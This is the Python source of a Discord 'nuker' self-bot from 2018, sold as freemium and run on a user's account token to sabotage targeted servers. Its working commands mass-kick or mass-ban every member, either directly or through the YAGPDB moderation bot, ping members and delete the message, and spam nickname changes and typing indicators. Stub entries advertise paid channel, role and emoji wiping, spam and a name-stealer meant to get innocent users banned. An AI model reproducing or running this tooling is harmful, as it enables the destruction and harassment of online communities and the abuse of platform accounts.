### BLADE DISCORD MULTIPURPOSE/NUKER SELF-BOT ###
### THE ONLY MULTI-PURPOSE SELF-BOT WITH YAGPDB.XYZ BOT CAPABALITIES ###
### COPYRIGHT 2018 BladeDiscordBot ###
### SHOUTOUT DA532, HIS BOT IS THE REASON I WROTE MINE AND IS HEAVILY INSPRIED BY IT ###

### DISCLAIMER ###
### THE AUTHOR OF THE PROGRAM IS NOT RESPONSIBLE FOR ANY DAMAGES CAUSED AND DOES NOT PROVIDE ###
### ANY SORT OF WARRANTY TO GO ALONG WITH THE PRODUCT. DO NOT BLAME THE AUTHOR FOR ANY DAMAGES ###
### DONE TO YOUR SERVER/ACCOUNT BECAUSE OF ITS USE. IT IS RECOMMENDED YOU USE AN ALTERNATE ACCOUNT ###
### BEFORE USING THE BOT. ###

### FREE VERSION ONLY CONTAINS BASIC COMMANDS ###
### PURCHASE THE FULL VERSION TO RECEIVE ACCESS TO FEATURES SUCH AS MASS PING, MASS CHANNEL/ROLE/EMOJI DELETION, NAMESTEALER, TEXT SPAMMER, AND MORE ###
### ALL PURCHASERS GET FREE UPDATES FOREVER ###
### ONLY $10 TO PURCHASE ###
### CONTACT 4xanny#9783 ON DISCORD OR bladediscordbot@gmail.com TO LEARN MORE ###

### CONFIGURATION ###
# ----------------- #
token = "" # https://discordhelp.net/discord-token
prefix = "!" # This is the symbol that you will need to precede every command with.
yprefix = "-" # This is the symbol used for the YAGPDB bot in the server you're targeting. It is usually this dash (-) but in the case it isn't, change it here.
# ----------------- #

import discord
from random import *
import string
from discord.ext import commands
from discord.ext.commands import Bot
from threading import Thread
import time

print ("--- BLADE DISCORD MULTIPURPOSE/NUKER SELF-BOT ---")
print ("---WRITTEN BY 4XANNY#9783 ON DISCORD---")
print ("---FREE VERSION, HIT ME UP ON DISCORD TO PURCHASE FULL VERSION---")
print ("---OR CONTACT VIA E-MAIL AT bladediscordbot@gmail.com")
print ("---Starting up---")

bot = commands.Bot(command_prefix=prefix, self_bot=True)
bot.remove_command("help")

@bot.event
async def on_ready():
    print ("Bot now active.")
    print ("Free Commands: ")
    print (prefix + "autoname - Automatically changes your nickname every second.")
    print (prefix + "newname - Generates a new nickname in the targeted server, ranging from 2-32 characters.")
    print (prefix + "kickall - Kicks all members from the server that the command is run in.")
    print (prefix + "banall - Bans all members from the server that the command is run in.")
    print (prefix + "ykickall - Kicks all members from the server that the command is run in through the YAGPDB bot.")
    print (prefix + "ybanall - Bans all members from the server that the command is run in through the YAGPDB bot.")
    print (prefix + "ping - Pings a random member of the server and instantly deletes it.")
    print (prefix + "faketyping - Simulate typing in targeted channel. Runs forever until bot is restarted or you're banned from server.")
    print (prefix + "stop - Disconnects the bot, stops all commands, and quits the application.")
    print("Paid Commands: ")
    print (prefix + "namestealer - Steals names of other users in the server and makes them your nickname. Can lead to admins accidentally banning someone instead of you. Stops when the bot leaves/is banned from the server.")
    print (prefix + "faketypingall - Simulate typing in ALL channels in targeted server. Runs forever until bot is restarted or you're banned from server.")
    print (prefix + "pingall - Pings all members of the server in a discrete manner until it runs out of members to ping. You can type this command with a number for delay (in seconds)")
    print (prefix + "masspingall - Fits as many members mentions as it can into a message, sends the message, and instantly deletes it. Works until you're banned from server.")
    print (prefix + "wipe - Deletes all channels, emotes and roles.")
    print (prefix + "spam - Adds a bunch of garbage channels and roles to the server.")
    print (prefix + "spamwipe - Runs wipe command, bans all members, then runs spamserver command.")
    print (prefix + "nowplaying - Changes your status to playing a game. Example call: 'nowplaying games'")
    print (prefix + "spamtext - Spams text in the targeted channel. You can contain a list of strings you want it to spam in the included 'text_to_spam' file. Otherwise, it will spam the default message. You can specify a delay.")

### FREE COMMANDS ###

# Kicks all members from the server.
@bot.command(pass_context=True)
async def kickall(ctx):
    await bot.delete_message(ctx.message)
    if bot.user.id == ctx.message.author.id:
        for member in list(ctx.message.server.members):
            try:
                if bot.user.id != member.id:
                    await bot.kick(member)
                    try:
                        print (member.name + " has been kicked from the targeted server.")
                    except:
                        print ("Someone whose name I can't print out has been kicked from the server.") # Some names contain illegal characters Python cannot print.
            except:
                print ("Could not kick user, likely banned from server, breaking out of method...")
                return
        print("Kicked all members from server successfully.")

# Bans all members from the server.
@bot.command(pass_context=True)
async def banall(ctx):
    if bot.user.id == ctx.message.author.id:
        await bot.delete_message(ctx.message)
        for member in list(ctx.message.server.members):
            try:
                if bot.user.id != member.id:
                    await bot.ban(member)
                    try:
                        print (member.name + " has been BANNED from the targeted server.")
                    except:
                        print ("Someone whose name I can't print out has been banned from the server.") # Some names contain illegal characters Python cannot print.
            except:
                print ("Could not ban user, you're likely banned, breaking out of method...")
                return
        print ("Banned all users from server successfully.")

# Kicks all members from the server, only use this command if server exclusively uses YAGPDB bot for moderation.
@bot.command(pass_context=True)
async def ykickall(ctx):
    if bot.user.id == ctx.message.author.id:
        await bot.delete_message(ctx.message)
        sent = None
        for member in list (ctx.message.server.members):
            if bot.user.id != member.id:
                try:
                    sent = await bot.send_message(ctx.message.channel, yprefix + "kick " + member.mention + " bye")
                    try:
                        print (member.name + " has been kicked from selected server using the YAGPDB bot.")
                    except:
                        print ("Someone has been kicked from selected server using the YAGPDB bot.")
                except:
                    print ("Could not send message, likely banned from server, breaking out of method...")
                    return
                try:
                    await bot.delete_message(sent)
                except:
                    pass
        print ("Kicked all members from server using YAGPDB bot successfully.")

# Bans all members from the server, only use this command if server exclusively uses YAGPDB bot for moderation.
@bot.command(pass_context=True)
async def ybanall(ctx):
    if bot.user.id == ctx.message.author.id:
        await bot.delete_message(ctx.message)
        sent = None
        for member in list (ctx.message.server.members):
            if bot.user.id != member.id:
                try:
                    sent = await bot.send_message(ctx.message.channel, yprefix + "ban " + member.mention + " bye")
                    try:
                        print (member.name + " has been BANNED from selected server using the YAGPDB bot.")
                    except:
                        print ("Someone has been BANNED from selected server using the YAGPDB bot.")
                except:
                    print ("Could not send message, likely banned from server, breaking out of method...")
                    return
                try:
                    await bot.delete_message(sent)
                except:
                    pass
        print ("Banned all members from server using YAGPDB bot successfully.")

# Pings a random user in the targeted server.
@bot.command(pass_context=True)
async def ping(ctx):
    if bot.user.id == ctx.message.author.id:
        await bot.delete_message(ctx.message)
        try:
           members = []
           for member in list (ctx.message.server.members):
                members.append(member)
                membercount = len(members)
           randomNumber = randint(0, (membercount - 1))
           sent = await bot.send_message(ctx.message.channel, members[randomNumber].mention)
           print("User has been pinged.")
           await bot.delete_message(sent)
        except:
            print("Problem sending or deleting a message, you may have been banned, breaking out of method...")
            return
        print("Operation Completed: 'ping'")

# Simulate typing a message in targeted channel.
@bot.command(pass_context=True)
async def faketyping(ctx):
    if bot.user.id == ctx.message.author.id:
        await bot.delete_message(ctx.message)
        while True:
            try:
                await bot.send_typing(ctx.message.channel)
                time.sleep(2.5)
            except:
                print("Problem simulating typing, you may have been banned, breaking out of method...")
                return

@bot.command(pass_context=True)
async def stop(ctx):
    if bot.user.id == ctx.message.author.id:
        await bot.delete_message(ctx.message)
        bot.logout()
        print ("Operation Completed: 'stop'")
        exit()
		
# Generates a new nickname for you in the designated server ranging from 2-32 characters.
@bot.command(pass_context=True)
async def newname(ctx):
    if bot.user.id == ctx.message.author.id:
        await bot.delete_message(ctx.message)
        newname = genrandomusername()
        try:
            await bot.change_nickname(ctx.message.author, newname)
        except:
            print("Unable to change nickname, possibly banned from server, breaking out of method...")
            return
        print("Operation Completed: 'newname'")

# The task is responsible for changing the user's name every five seconds.
@bot.command(pass_context=True)
async def autoname(ctx):
    if bot.user.id == ctx.message.author.id:
        await bot.delete_message(ctx.message)
        while True:
            newname = genrandomusername()
            try:
                await bot.change_nickname(ctx.message.author, newname)
            except:
                print("Unable to change nickname in server, you may have been banned, breaking out of method...")
                return
		
# Used by autoname and newname commands.
def genrandomusername():
    min_char = 2
    max_char = 32
    allchar = string.ascii_letters + string.digits
    newname = "".join(choice(allchar) for x in range(randint(min_char, max_char)))
    return newname
       
### PREMIUM COMMANDS ###
### ALL COMMANDS AVAILABLE IN PAID VERSION LISTED BELOW. ###
### THEY WILL NOT DO ANYTHING UNTIL THE PRODUCT IS PURCHASED. ###

@bot.command(pass_context=True)
async def namestealer(ctx):
    if bot.user.id == ctx.message.author.id:
        print ("You must buy the bot before running this command. E-mail bladediscordbot@gmail.com to purchase.")

# Pings a member of the server and deletes the message immediately after. Continues to do this until all members have been pinged.
@bot.command(pass_context=True)
async def pingall(ctx, delay=0):
    if bot.user.id == ctx.message.author.id:
        print ("You must buy the bot before running this command. E-mail bladediscordbot@gmail.com to purchase.")
	
# Pings a ton of members in the server and deletes the message immediately after. Server bots may ban you right away for using this command, please use carefully.
@bot.command(pass_context=True)
async def masspingall(ctx, delay=0):
    if bot.user.id == ctx.message.author.id:
        print ("You must buy the bot before running this command. E-mail bladediscordbot@gmail.com to purchase.")
               
# Simulate typing a message in all channels on the server. Works a bit inconsistently, but definitely annoying if people are active in the server.
@bot.command(pass_context=True)
async def faketypingall(ctx):
    if bot.user.id == ctx.message.author.id:
        print ("You must buy the bot before running this command. E-mail bladediscordbot@gmail.com to purchase.")
               
# Wipes all server elements, including channels, roles, emojis, and members. If the wipe completes in time before being banned, it will also add bogus channels and roles to make server cleanup much more irritating for moderators.
@bot.command(pass_context=True)
async def spamwipe(ctx):
    if bot.user.id == ctx.message.author.id:
        print ("You must buy the bot before running this command. E-mail bladediscordbot@gmail.com to purchase.")
               
# Wipes all emotes, channels, and roles.
@bot.command(pass_context=True)
async def wipe(ctx):
    if bot.user.id == ctx.message.author.id:
        print ("You must buy the bot before running this command. E-mail bladediscordbot@gmail.com to purchase.")
               
# Adds a bunch of garbage channels and roles to the server.
@bot.command(pass_context=True)
async def spamserver(ctx):
    if bot.user.id == ctx.message.author.id:
        print ("You must buy the bot before running this command. E-mail bladediscordbot@gmail.com to purchase.")
               
# Changes the status of the user to "Playing [user input]". Example call: "nowplaying games".
@bot.command(pass_context=True)
async def nowplaying(ctx, game):
    if bot.user.id == ctx.message.author.id:
        print ("You must buy the bot before running this command. E-mail bladediscordbot@gmail.com to purchase.")
               
# Spams targeted channel with all strings in file 'text_to_spam.txt'.	
@bot.command(pass_context=True)
async def spamtext(ctx, delay=0):
    if bot.user.id == ctx.message.author.id:
        print ("You must buy the bot before running this command. E-mail bladediscordbot@gmail.com to purchase.")
                      
bot.run(token, bot=False)
